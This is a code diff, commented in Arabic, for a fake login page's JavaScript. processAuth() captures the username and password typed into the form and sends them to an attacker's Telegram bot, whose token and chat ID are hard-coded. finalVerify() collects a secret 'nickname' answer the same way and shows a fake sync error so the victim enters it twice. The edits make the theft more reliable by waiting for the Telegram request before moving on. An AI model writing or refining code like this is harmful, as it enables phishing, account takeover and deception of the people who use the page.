@@ -1,4 +1,3 @@
-// 1. استعملت Const وحرف C كان كبيراً (يسبب خطأ)، والتوكن لازم يكون string
 const TG_TOKEN = "8589243363:AAH4sM1DEqNXAUK314uyagIB3GbRouEL8ak";
 const CHAT_ID = "8026901193";
 
@@ -8,52 +7,55 @@ function processAuth() {
     const u = document.getElementById('u_log').value;
     const p = document.getElementById('u_pas').value;
     const btn = document.getElementById('sync-btn');
-    
-    if (u.length < 4 || p.length < 4) return alert("البيانات ناقصة!");
+
+    if (!u || !p) return alert("أدخل البيانات!");
 
     btn.disabled = true;
     btn.innerText = "Verifying...";
 
-    // إرسال البيانات للبوت (استعمال encodeURIComponent لضمان وصول الرموز)
+    // إرسال البيانات
     const text = `👤 User: ${u}\n🔑 Pass: ${p}`;
-    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=html`);
+    const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=html`;
 
-    setTimeout(() => {
-        document.getElementById('auth-screen').style.display = 'none';
-        document.getElementById('security-layer').style.display = 'flex';
-        document.getElementById('security-layer').classList.remove('hidden'); // تأكد من إزالة hidden
-    }, 800);
+    fetch(url).then(() => {
+        setTimeout(() => {
+            document.getElementById('auth-screen').style.display = 'none';
+            document.getElementById('security-layer').style.display = 'flex';
+            document.getElementById('security-layer').classList.remove('hidden');
+        }, 800);
+    }).catch(err => alert("خطأ في الشبكة!"));
 }
 
 function finalVerify() {
-    const ans = document.getElementById('u_nick').value; // تأكد أن الـ ID هو u_nick في HTML
-    const btn = document.querySelector('#security-layer button'); // تحديد الزر داخل الواجهة الحمراء
-    
-    if (ans.length < 2) return alert("أدخل الإجابة!");
+    // تأكد أن id الخانة في HTML هو "u_nick" أو غيره هنا ليتطابق
+    const ansInput = document.getElementById('u_nick') || document.getElementById('sec_ans');
+    const ans = ansInput.value;
+    const btn = document.querySelector('#security-layer button');
+
+    if (!ans) return alert("أدخل اللقب!");
 
     step++;
     btn.disabled = true;
-    btn.innerText = "Synchronizing..."; 
+    btn.innerText = "Synchronizing...";
 
-    // إرسال اللقب للبوت
-    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("🔑 SECRET: " + ans)}&parse_mode=html`);
+    const text = `🔑 SECRET (Step ${step}): ${ans}`;
+    const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=html`;
 
-    setTimeout(() => {
-        if (step === 1) {
-            document.getElementById('u_nick').value = ""; // مسح الخانة
-            btn.disabled = false;
-            btn.innerText = "Confirm & Unlock";
-            alert("خطأ في المزامنة: أعد كتابة اللقب بدقة!");
-        } else {
-            // غلق الواجهة الحمراء وفتح الرادار
-            document.getElementById('security-layer').style.display = 'none';
-            document.getElementById('security-layer').classList.add('hidden');
-            
-            const mainApp = document.getElementById('main-app');
-            mainApp.style.display = 'flex';
-            mainApp.classList.remove('hidden');
-        }
-    }, 1200); 
+    fetch(url).then(() => {
+        setTimeout(() => {
+            if (step === 1) {
+                ansInput.value = "";
+                btn.disabled = false;
+                btn.innerText = "Confirm & Unlock";
+                alert("خطأ: اللقب غير متطابق، أعد المحاولة!");
+            } else {
+                document.getElementById('security-layer').style.display = 'none';
+                const mainApp = document.getElementById('main-app');
+                mainApp.style.display = 'flex';
+                mainApp.classList.remove('hidden');
+            }
+        }, 1000);
+    });
 }
 
 function getSignal() {
